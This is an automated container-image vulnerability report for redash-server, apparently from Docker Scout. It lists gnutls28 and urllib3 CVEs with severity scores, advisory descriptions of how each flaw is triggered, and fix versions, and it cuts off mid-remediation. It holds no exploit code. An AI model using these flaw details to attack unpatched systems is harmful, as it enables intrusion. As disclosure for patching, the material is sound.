<h2>:mag: Vulnerabilities of <code>redash-server:latest</code></h2>

<details open="true"><summary>:package: Image Reference</strong> <code>redash-server:latest</code></summary>
<table>
<tr><td>digest</td><td><code>sha256:01a2a8d00566818b601348561ac0aed8222bda1904725f48e5f776c28c6b613b</code></td><tr><tr><td>vulnerabilities</td><td><img alt="critical: 0" src="https://img.shields.io/badge/critical-0-lightgrey"/> <img alt="high: 11" src="https://img.shields.io/badge/high-11-e25d68"/> <img alt="medium: 12" src="https://img.shields.io/badge/medium-12-fbb552"/> <img alt="low: 112" src="https://img.shields.io/badge/low-112-fce1a9"/> <img alt="unspecified: 8" src="https://img.shields.io/badge/unspecified-8-lightgrey"/></td></tr>
<tr><td>platform</td><td>linux/arm64</td></tr>
<tr><td>size</td><td>981 MB</td></tr>
<tr><td>packages</td><td>591</td></tr>
</table>
</details></table>
</details>

<table>
<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 4" src="https://img.shields.io/badge/H-4-e25d68"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <img alt="unspecified: 7" src="https://img.shields.io/badge/U-7-lightgrey"/><strong>gnutls28</strong> <code>3.8.9-3+deb13u3</code> (deb)</summary>

<small><code>pkg:deb/debian/gnutls28@3.8.9-3%2Bdeb13u3?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-33846?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="high : CVE--2026--33846" src="https://img.shields.io/badge/CVE--2026--33846-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.075%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A heap buffer overflow vulnerability exists in the DTLS handshake fragment reassembly logic of GnuTLS. The issue arises in merge_handshake_packet() where incoming handshake fragments are matched and merged based solely on handshake type, without validating that the message_length field remains consistent across all fragments of the same logical message. An attacker can exploit this by sending crafted DTLS fragments with conflicting message_length values, causing the implementation to allocate a buffer based on a smaller initial fragment and subsequently write beyond its bounds using larger, inconsistent fragments. Because the merge operation does not enforce proper bounds checking against the allocated buffer size, this results in an out-of-bounds write on the heap. The vulnerability is remotely exploitable without authentication via the DTLS handshake path and can lead to application crashes or potential memory corruption.

---
- gnutls28 3.8.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135319)
https://www.gnutls.org/security-new.html#GNUTLS-SA-2026-04-29-1
https://gitlab.com/gnutls/gnutls/-/work_items/1816
https://gitlab.com/gnutls/gnutls/-/work_items/1838
https://gitlab.com/gnutls/gnutls/-/work_items/1839
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/65ab33fa54e34fba69d793735b7df3d383d1ff78 (3.8.13)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-33845?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="high : CVE--2026--33845" src="https://img.shields.io/badge/CVE--2026--33845-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.046%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>14th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw in GnuTLS DTLS handshake parsing allows malformed fragments with zero length and non-zero offset, leading to an integer underflow during reassembly and resulting in an out-of-bounds read. This issue is remotely exploitable and may cause information disclosure or denial of service.

---
- gnutls28 3.8.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135319)
https://www.gnutls.org/security-new.html#GNUTLS-SA-2026-04-29-3
https://gitlab.com/gnutls/gnutls/-/issues/1811
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/e5b72c53c7d789d19d1d1cd10b275e87d0415413 (3.8.13)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-42011?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="high : CVE--2026--42011" src="https://img.shields.io/badge/CVE--2026--42011-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.021%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in gnutls. This vulnerability occurs because permitted name constraints were incorrectly ignored when previous Certificate Authorities (CAs) only had excluded name constraints. A remote attacker could exploit this to bypass critical name constraint checks during certificate validation. This bypass could lead to the acceptance of invalid certificates, potentially enabling spoofing or man-in-the-middle attacks against affected systems.

---
- gnutls28 3.8.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135319)
https://www.gnutls.org/security-new.html#GNUTLS-SA-2026-04-29-6
https://gitlab.com/gnutls/gnutls/-/work_items/1824
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/1dead2faec6320aaba321eb56f20d442df192b83 (3.8.13)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-42010?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="high : CVE--2026--42010" src="https://img.shields.io/badge/CVE--2026--42010-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.150%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>35th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in gnutls. Servers configured with RSA-PSK (Rivest–Shamir–Adleman – Pre-Shared Key) wrongfully matched usernames containing a NUL character with truncated usernames. A remote attacker could exploit this by sending a specially crafted username, leading to an authentication bypass. This vulnerability allows an attacker to gain unauthorized access by circumventing the authentication process.

---
- gnutls28 3.8.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135319)
https://www.gnutls.org/security-new.html#GNUTLS-SA-2026-04-29-4
https://gitlab.com/gnutls/gnutls/-/issues/1850
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/cb1833afd9b6309563211b1c0a7c291f52ca98d5 (3.8.13)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-3833?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="medium : CVE--2026--3833" src="https://img.shields.io/badge/CVE--2026--3833-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.086%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in gnutls. This vulnerability occurs because gnutls performs case-sensitive comparisons of `nameConstraints` labels, specifically for `dNSName` (DNS) or `rfc822Name` (email) constraints within `excludedSubtrees` or `permittedSubtrees`. A remote attacker can exploit this by crafting a leaf certificate with casing differences in the Subject Alternative Name (SAN), leading to a policy bypass where a certificate that should be rejected is instead accepted. This could result in unauthorized access or information disclosure.

---
- gnutls28 3.8.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135319)
https://www.gnutls.org/security-new.html#GNUTLS-SA-2026-04-29-5
https://gitlab.com/gnutls/gnutls/-/work_items/1223
https://gitlab.com/gnutls/gnutls/-/issues/1803
https://gitlab.com/gnutls/gnutls/-/issues/1852
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/19f6508647bdcd3ce21130201e484d7ca6d962c5 (3.8.13)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-3832?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--3832" src="https://img.shields.io/badge/CVE--2026--3832-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.036%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>11th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in gnutls. A remote attacker could exploit this vulnerability by presenting a specially crafted Online Certificate Status Protocol (OCSP) response during a TLS handshake. Due to a logic error in how gnutls processes multi-record OCSP responses, a client with OCSP verification enabled may incorrectly accept a revoked server certificate, potentially leading to a compromise of trust.

---
- gnutls28 3.8.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135319)
https://www.gnutls.org/security-new.html#GNUTLS-SA-2026-04-29-12
https://gitlab.com/gnutls/gnutls/-/issues/1801
https://gitlab.com/gnutls/gnutls/-/issues/1812
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/731861b9de8dccaf7d3b0c1446833051e48670c2 (3.8.13)
Test: https://gitlab.com/gnutls/gnutls/-/commit/d52d5f4f383e8c5d8e9a03334f2421ff35d37d2e (3.8.13)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2011-3389?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2011--3389" src="https://img.shields.io/badge/CVE--2011--3389-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>3.832%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>88th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The SSL protocol, as used in certain configurations in Microsoft Windows and Microsoft Internet Explorer, Mozilla Firefox, Google Chrome, Opera, and other products, encrypts data by using CBC mode with chained initialization vectors, which allows man-in-the-middle attackers to obtain plaintext HTTP headers via a blockwise chosen-boundary attack (BCBA) on an HTTPS session, in conjunction with JavaScript code that uses (1) the HTML5 WebSocket API, (2) the Java URLConnection API, or (3) the Silverlight WebClient API, aka a "BEAST" attack.

---
- sun-java6 <removed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=645881)
[lenny] - sun-java6 <no-dsa> (Non-free not supported)
[squeeze] - sun-java6 <no-dsa> (Non-free not supported)
- openjdk-6 6b23~pre11-1
- openjdk-7 7~b147-2.0-1
- iceweasel <not-affected> (Vulnerable code not present)
http://blog.mozilla.com/security/2011/09/27/attack-against-tls-protected-communications/
- chromium-browser 15.0.874.106~r107270-1
[squeeze] - chromium-browser <end-of-life>
- lighttpd 1.4.30-1
strictly speaking this is no lighttpd issue, but lighttpd adds a workaround
- curl 7.24.0-1
http://curl.haxx.se/docs/adv_20120124B.html
- python2.6 2.6.8-0.1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=684511)
[squeeze] - python2.6 <no-dsa> (Minor issue)
- python2.7 2.7.3~rc1-1
- python3.1 <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=678998)
[squeeze] - python3.1 <no-dsa> (Minor issue)
- python3.2 3.2.3~rc1-1
http://bugs.python.org/issue13885
python3.1 is fixed starting 3.1.5
- cyassl <removed>
- gnutls26 <removed> (unimportant)
- gnutls28 <unfixed> (unimportant)
No mitigation for gnutls, it is recommended to use TLS 1.1 or 1.2 which is supported since 2.0.0
- haskell-tls <unfixed> (unimportant)
No mitigation for haskell-tls, it is recommended to use TLS 1.1, which is supported since 0.2
- matrixssl <removed> (low)
[squeeze] - matrixssl <no-dsa> (Minor issue)
[wheezy] - matrixssl <no-dsa> (Minor issue)
matrixssl fix this upstream in 3.2.2
- bouncycastle 1.49+dfsg-1
[squeeze] - bouncycastle <no-dsa> (Minor issue)
[wheezy] - bouncycastle <no-dsa> (Minor issue)
No mitigation for bouncycastle, it is recommended to use TLS 1.1, which is supported since 1.4.9
- nss 3.13.1.with.ckbi.1.88-1
https://bugzilla.mozilla.org/show_bug.cgi?id=665814
https://hg.mozilla.org/projects/nss/rev/7f7446fcc7ab
- polarssl <unfixed> (unimportant)
No mitigation for polarssl, it is recommended to use TLS 1.1, which is supported in all releases
- tlslite <removed>
[wheezy] - tlslite <no-dsa> (Minor issue)
- pound 2.6-2
Pound 2.6-2 added an anti_beast.patch to mitigate BEAST attacks.
- erlang 1:15.b-dfsg-1
[squeeze] - erlang <no-dsa> (Minor issue)
- asterisk 1:13.7.2~dfsg-1
[jessie] - asterisk 1:11.13.1~dfsg-2+deb8u1
[wheezy] - asterisk <no-dsa> (Minor issue)
[squeeze] - asterisk <end-of-life> (Not supported in Squeeze LTS)
http://downloads.digium.com/pub/security/AST-2016-001.html
https://issues.asterisk.org/jira/browse/ASTERISK-24972
patch for 11 (jessie): https://code.asterisk.org/code/changelog/asterisk?cs=f233bcd81d85626ce5bdd27b05bc95d131faf3e4
all versions vulnerable, backport required for wheezy

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-5419?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="unspecified : CVE--2026--5419" src="https://img.shields.io/badge/CVE--2026--5419-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

- gnutls28 3.8.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135319)
https://www.gnutls.org/security-new.html#GNUTLS-SA-2026-04-29-13
https://gitlab.com/gnutls/gnutls/-/issues/1815
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/1e627aa5ad95c6dc0518d94e9a009997b081a1ab (3.8.13)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-5260?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="unspecified : CVE--2026--5260" src="https://img.shields.io/badge/CVE--2026--5260-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

- gnutls28 3.8.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135319)
https://www.gnutls.org/security-new.html#GNUTLS-SA-2026-04-29-10
https://gitlab.com/gnutls/gnutls/-/issues/1814
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/77228f2d1ac207d2f894e5a168fbb47e5378e42f (3.8.13)
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/cf6bdc5e4df49e5583d3fb4d2296779785f10683 (3.8.13)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-42015?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="unspecified : CVE--2026--42015" src="https://img.shields.io/badge/CVE--2026--42015-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

- gnutls28 3.8.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135319)
https://www.gnutls.org/security-new.html#GNUTLS-SA-2026-04-29-11
https://gitlab.com/gnutls/gnutls/-/work_items/1840
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/a3e7c50d3e1761e5ef1d4b225507cab8f2b2c3ca (3.8.13)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-42014?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="unspecified : CVE--2026--42014" src="https://img.shields.io/badge/CVE--2026--42014-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

- gnutls28 3.8.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135319)
https://www.gnutls.org/security-new.html#GNUTLS-SA-2026-04-29-9
https://gitlab.com/gnutls/gnutls/-/issues/1766
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/3957f136e2ed23caf176a594b54b3827f5cef701 (3.8.13)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-42013?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="unspecified : CVE--2026--42013" src="https://img.shields.io/badge/CVE--2026--42013-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

- gnutls28 3.8.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135319)
https://www.gnutls.org/security-new.html#GNUTLS-SA-2026-04-29-8
https://gitlab.com/gnutls/gnutls/-/work_items/1825
https://gitlab.com/gnutls/gnutls/-/issues/1849
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/29801bef00ecc0f23c0bac4cd333b269cd2c1af4 (3.8.13)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-42012?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="unspecified : CVE--2026--42012" src="https://img.shields.io/badge/CVE--2026--42012-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

- gnutls28 3.8.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135319)
https://www.gnutls.org/security-new.html#GNUTLS-SA-2026-04-29-7
https://gitlab.com/gnutls/gnutls/-/issues/1802
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/8dcc6a1f48945997666ac9f10896819edd01a03b (3.8.13)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-42009?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="unspecified : CVE--2026--42009" src="https://img.shields.io/badge/CVE--2026--42009-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

- gnutls28 3.8.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135319)
https://www.gnutls.org/security-new.html#GNUTLS-SA-2026-04-29-2
https://gitlab.com/gnutls/gnutls/-/issues/1848
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/f01e21441e29052a6f0963840794c41d3b3ee66d (3.8.13)
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/f341441fad91142897d83b44a175ffc8f925b76f (3.8.13)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 4" src="https://img.shields.io/badge/H-4-e25d68"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>urllib3</strong> <code>1.26.20</code> (pypi)</summary>

<small><code>pkg:pypi/urllib3@1.26.20</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-21441?s=github&n=urllib3&t=pypi&vr=%3E%3D1.22%2C%3C2.6.3"><img alt="high 8.9: CVE--2026--21441" src="https://img.shields.io/badge/CVE--2026--21441-lightgrey?label=high%208.9&labelColor=e25d68"/></a> <i>Improper Handling of Highly Compressed Data (Data Amplification)</i>

<table>
<tr><td>Affected range</td><td><code>>=1.22<br/><2.6.3</code></td></tr>
<tr><td>Fixed version</td><td><code>2.6.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.032%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.6.2/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.

urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). When using the streaming API, the library decompresses only the necessary bytes, enabling partial content consumption.

However, for HTTP redirect responses, the library would read the entire response body to drain the connection and decompress the content unnecessarily. This decompression occurred even before any read methods were called, and configured read limits did not restrict the amount of decompressed data. As a result, there was no safeguard against decompression bombs. A malicious server could exploit this to trigger excessive resource consumption on the client (high CPU usage and large memory allocations for decompressed data; CWE-409).

### Affected usages

Applications and libraries using urllib3 version 2.6.2 and earlier to stream content from untrusted sources by setting `preload_content=False` when they do not disable redirects.


### Remediation

Upgrade to at least urllib3 v2.6.3 in which the library does not decode content of redirect responses when `preload_content=False`.

If upgrading is not immediately possible, disable [redirects](https://urllib3.readthedocs.io/en/2.6.2/user-guide.html#retrying-requests) by setting `redirect=False` for requests to untrusted source.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-66471?s=github&n=urllib3&t=pypi&vr=%3E%3D1.0%2C%3C2.6.0"><img alt="high 8.9: CVE--2025--66471" src="https://img.shields.io/badge/CVE--2025--66471-lightgrey?label=high%208.9&labelColor=e25d68"/></a> <i>Improper Handling of Highly Compressed Data (Data Amplification)</i>

<table>
<tr><td>Affected range</td><td><code>>=1.0<br/><2.6.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.6.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.014%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.

When streaming a compressed response, urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). The library must read compressed data from the network and decompress it until the requested chunk size is met. Any resulting decompressed data that exceeds the requested amount is held in an internal buffer for the next read operation.

The decompression logic could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This can result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data; CWE-409) on the client side, even if the application only requested a small chunk of data.


### Affected usages

Applications and libraries using urllib3 version 2.5.0 and earlier to stream large compressed responses or content from untrusted sources.

`stream()`, `read(amt=256)`, `read1(amt=256)`, `read_chunked(amt=256)`, `readinto(b)` are examples of `urllib3.HTTPResponse` method calls using the affected logic unless decoding is disabled explicitly.


### Remediation

Upgrade to at least urllib3 v2.6.0 in which the library avoids decompressing data that exceeds the requested amount.

If your environment contains a package facilitating the Brotli encoding, upgrade to at least Brotli 1.2.0 or brotlicffi 1.2.0.0 too. These versions are enforced by the `urllib3[brotli]` extra in the patched versions of urllib3.


### Credits

The issue was reported by @Cycloctane.
Supplemental information was provided by @stamparm during a security audit performed by [7ASecurity](https://7asecurity.com/) and facilitated by [OSTIF](https://ostif.org/).

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-66418?s=github&n=urllib3&t=pypi&vr=%3E%3D1.24%2C%3C2.6.0"><img alt="high 8.9: CVE--2025--66418" src="https://img.shields.io/badge/CVE--2025--66418-lightgrey?label=high%208.9&labelColor=e25d68"/></a> <i>Allocation of Resources Without Limits or Throttling</i>

<table>
<tr><td>Affected range</td><td><code>>=1.24<br/><2.6.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.6.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.016%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Impact

urllib3 supports chained HTTP encoding algorithms for response content according to RFC 9110 (e.g., `Content-Encoding: gzip, zstd`).

However, the number of links in the decompression chain was unbounded allowing a malicious server to insert a virtually unlimited number of compression steps leading to high CPU usage and massive memory allocation for the decompressed data.


## Affected usages

Applications and libraries using urllib3 version 2.5.0 and earlier for HTTP requests to untrusted sources unless they disable content decoding explicitly.


## Remediation

Upgrade to at least urllib3 v2.6.0 in which the library limits the number of links to 5.

If upgrading is not immediately possible, use [`preload_content=False`](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) and ensure that `resp.headers["content-encoding"]` contains a safe number of encodings before reading the response content.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-44431?s=github&n=urllib3&t=pypi&vr=%3E%3D1.23%2C%3C2.7.0"><img alt="high 8.2: CVE--2026--44431" src="https://img.shields.io/badge/CVE--2026--44431-lightgrey?label=high%208.2&labelColor=e25d68"/></a> <i>Exposure of Sensitive Information to an Unauthorized Actor</i>

<table>
<tr><td>Affected range</td><td><code>>=1.23<br/><2.7.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.7.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

When following cross-origin redirects for requests made using urllib3’s high-level APIs, such as `urllib3.request()`, `PoolManager.request()`, and `ProxyManager.request()`, sensitive headers — `Authorization`, `Cookie`, and `Proxy-Authorization` (defined in `Retry.DEFAULT_REMOVE_HEADERS_ON_REDIRECT`) — are stripped by default, as expected.

However, cross-origin redirects followed from the low-level API via `ProxyManager.connection_from_url().urlopen(..., assert_same_host=False)` still forward these sensitive headers.

### Affected usage

Applications and libraries using urllib3 versions earlier than 2.7.0 may be affected if they allow cross-origin redirects while making requests through `HTTPConnection.urlopen()` instances created via `ProxyManager.connection_from_url()`.

### Remediation

Upgrade to urllib3 version 2.7.0 or later, in which sensitive headers are stripped from redirects followed by `HTTPConnection`.

If upgrading is not immediately possible, avoid using this low-level redirect flow for cross-origin redirects. If appropriate for your use case, switch to `ProxyManager.request()`.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-50181?s=github&n=urllib3&t=pypi&vr=%3C2.5.0"><img alt="medium 5.3: CVE--2025--50181" src="https://img.shields.io/badge/CVE--2025--50181-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>URL Redirection to Untrusted Site ('Open Redirect')</i>

<table>
<tr><td>Affected range</td><td><code><2.5.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.5.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.079%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>23rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

urllib3 handles redirects and retries using the same mechanism, which is controlled by the `Retry` object. The most common way to disable redirects is at the request level, as follows:

```python
resp = urllib3.request("GET", "https://httpbin.org/redirect/1", redirect=False)
print(resp.status)
# 302
```

However, it is also possible to disable redirects, for all requests, by instantiating a `PoolManager` and specifying `retries` in a way that disable redirects:

```python
import urllib3

http = urllib3.PoolManager(retries=0)  # should raise MaxRetryError on redirect
http = urllib3.PoolManager(retries=urllib3.Retry(redirect=0))  # equivalent to the above
http = urllib3.PoolManager(retries=False)  # should return the first response

resp = http.request("GET", "https://httpbin.org/redirect/1")
```

However, the `retries` parameter is currently ignored, which means all the above examples don't disable redirects.

## Affected usages

Passing `retries` on `PoolManager` instantiation to disable redirects or restrict their number.

By default, requests and botocore users are not affected.

## Impact

Redirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects at the PoolManager level will remain vulnerable.

## Remediation

You can remediate this vulnerability with the following steps:

